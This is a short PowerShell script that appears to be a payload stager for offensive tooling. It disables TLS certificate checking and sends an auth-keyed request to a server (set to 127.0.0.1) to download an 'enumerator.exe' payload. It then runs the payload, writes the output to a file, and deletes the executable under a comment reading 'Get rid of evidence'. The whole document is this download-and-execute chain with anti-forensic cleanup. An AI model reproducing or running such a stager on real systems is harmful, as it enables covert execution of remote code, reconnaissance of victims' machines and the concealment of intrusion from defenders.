# This is intended to be a copy and paste from PowerShell Test
# Ideally, we use the exact same script for every payload

add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$IP_ADDR = "https://127.0.0.1"

# NOTE: ` --> `` in Powershell since that is an escape character.
$AUTH_KEY = "tmMEQW=S0_O}<0F_1]iadHUH5MyBZqfVcRW3``vEG8v?5t[p81QQ4qh^YSix{P0``DuTvg81``D[YEaSjYOgQJu<~LRAAsF3>~@Bg~seca{OuUTBq?<^zevI}C@lTz[8UNa:C7?>]Vfd1mXs7nvV]C^v;M|^:dZ&aA3``x9jK6IQI<f2ecFcP=i?wzhKB0XQ>9Wg``V<8wINFj{LLs=1qrbDV82<t8NeX8{Lr]j}4s4zx;Jp^aP13uprR;Q49;1wIx<s[{Y&Imq9Az9p;}T5@NdSVY7Az]8``XDMon]IT==vC[FXv@at]&bz=pW=l<AS8Q4Oe6o44:OrOBiW:aAhK{4StA:_SQlOfU1^4UHmNc_<hihr&j@]]O5@23``usV&Ew^aJvtidXP<1BIY8Rn4CCblsqdHnZ;BarIC5LQ5AASL4T<O9f3dDRF]cwl``JbjOLIZ}R;``tYd9X6w|3}a99>iSQt<IcUy^k4yMHBWA__6e:3ouRp7O5Y4;U;CipxYJ}Zzje56["

# Craft our HTTP parameter. We need to use a Hashtable for this in PowerShell since we'll pass it in with the `methods` parameter
$GET_HEADER = New-Object System.Collections.Hashtable;
$GET_HEADER.Add("exe", "enumeratorRecursive");
$GET_HEADER.Add("authorization", $AUTH_KEY);

# Create HTTP Object
$HTTP_REQUEST = Invoke-WebRequest -Uri $IP_ADDR -Method Get -Headers $GET_HEADER -OutFile ./enumerator.exe

# Run ls_read.exe
# DEBUG: Redirect output into output.txt
./enumerator.exe > output.txt

# Get rid of evidence
rm ./enumerator.exe